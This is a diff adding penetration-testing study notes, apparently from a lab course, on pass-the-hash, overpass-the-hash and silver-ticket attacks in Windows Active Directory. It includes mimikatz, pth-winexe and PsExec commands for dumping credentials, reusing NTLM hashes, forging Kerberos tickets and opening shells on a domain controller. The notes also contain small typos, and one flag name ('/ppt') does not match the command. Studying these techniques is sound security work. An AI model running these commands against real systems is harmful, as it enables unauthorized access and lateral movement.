@@ -177,9 +177,152 @@ hashcat
 
 <mark style="color:yellow;">Can we pass the hash if password cracking is not possible?</mark>
 
-### Pass the Hash
+## Pass the Hash
 
-655
+Pass the Hash (PTH) is a technique that allows an attacker to authenticate to a remote system or service using a user's NTLM hash instead of the associated plaintext password.
+
+Use these tools to PTH:
+
+* PsExec
+* Metasploit
+* Impacket
+* Passing-the-Hash Toolkit
+
+PTH Toolkit:
+
+```
+pth-winexe -U Administrator%aad3b435b51404eeaad3b435b51404ee:2892d26cdf84d7a70e2eb3b9f05c425e 
+//10.11.0.22 cmd
+```
+
+## Overpass the Hash
+
+This method can be used to over abuse an NTLM user hash to gain a full Kerberos Ticket Granting Ticket (TGT) or service ticket.&#x20;
+
+This will in return grant us access to another machine or service as that user.
+
+We can verify this with mimikatz:
+
+```
+sekurlsa::logonpasswords
+```
+
+* This will display cached credentials
+* NTLM hash
+* We can then leverage this to overpass the hash
+
+<mark style="color:yellow;">Our goal is to turn the NTLM hash into a Kerberos ticket and avoid the use of NTLM authentication.</mark>&#x20;
+
+We can do this will sekurlsa::pth from mimikatz:
+
+```
+sekurlsa::pth /user:jeff_admin /domain:corp.com 
+/ntlm:e2b475c11da2a0748290d87aa966c327 /run:PowerShell.exe
+```
+
+* Now that we have a new PowerShell session, we can execute commands as this user.
+
+List cached Kerberos tickets:
+
+```
+klist
+
+#if there are none, generate some by authenticating to the network share
+
+net use \\hostname
+
+klist
+```
+
+It is possible for PsExec to run a command remotely but does not accept password hashes.
+
+This is possible with a generated Kerberos hash. We can then reuse this TGT to obtain code execution on the DC.
+
+By running PsExec to launch cmd.exe remotely on a remote machine as a high privileged user:
+
+```
+.\PsExec.exe \\dc01 cmd.exe
+
+C:\Windows\System32>
+```
+
+## Pass the Ticket (Silver Ticket)
+
+The Pass the Ticket attack takes advantage of the TGS, which may be exported and re-injected elsewhere on the network.
+
+It can then be used to authenticate to a service.
+
+If the service tickets belong to the current user, no administrative privileges are required.
+
+Mimikatz can craft a silver ticket and inject it into memory using the kerberos::golden command
+
+* <mark style="color:yellow;">Yes, the syntax is misleading.</mark>
+
+To create a ticket, we need the Security Identifier or SID of the domain.
+
+Example of SID:
+
+```
+S-1-5-21-2536614405-3629634762-1218571035-1116
+
+```
+
+<mark style="color:yellow;">We can easily find the SID of our current user with the whoami /user command and extract the domain SID part of it.</mark>
+
+```
+whoami /user
+
+SID
+S-1-5-21-2536614405-3629634762-1218571035-1116
+
+```
+
+Now that we have the domain SID, let's craft a silver ticket for the IIS service
+
+### Requirements
+
+1. The silver ticket command requires a username <mark style="color:yellow;">/user</mark>
+
+&#x20; 2\. Domain name <mark style="color:yellow;">/domain</mark>
+
+&#x20; 3\. Domain SID <mark style="color:yellow;">/sid</mark>
+
+&#x20; 4\. Fully qualified host name of the     service <mark style="color:yellow;">/target</mark>
+
+&#x20; 5\. Service rtpe <mark style="color:yellow;">/service:HTTP</mark>
+
+&#x20; 6\. Password hash of service account <mark style="color:yellow;">/rc4</mark>
+
+Finally, the silver ricket is injected into memory with the /ppt flag.
+
+<mark style="color:yellow;">Before running this, we will flush any existing Kerberos tickets with kerberos::purge and verify the purge with kerberos::list</mark>
+
+Mimikatz:
+
+```
+kerberos::purge
+Ticket(s) purge for current session is ok
+
+kerberos::list
+
+kerberos::golden /user:offsec /domain:corp.com /sid:S-1-5-21-1602875587-
+2787523311-2599479668 /target:CorpWebServer.corp.com /service:HTTP 
+/rc4:E2B475C11DA2A0748290D87AA966C327 /ptt
+
+kerberos::list
+```
+
+* To create a silver ticket, we use the password hash and not the cleartext password
+* If a Kerberoast session presented us with the cleartext password, we must hash it before using it to generate a silver ticket
+
+### Conclusion
+
+* Now that we have this ticket loaded into memory, we can interact with the service and gain access to any information on the group memberships we put in the silver ticket
+* Depending on the service type, it might also be possible to obtain code execution
+
+
+
+
 
 
 
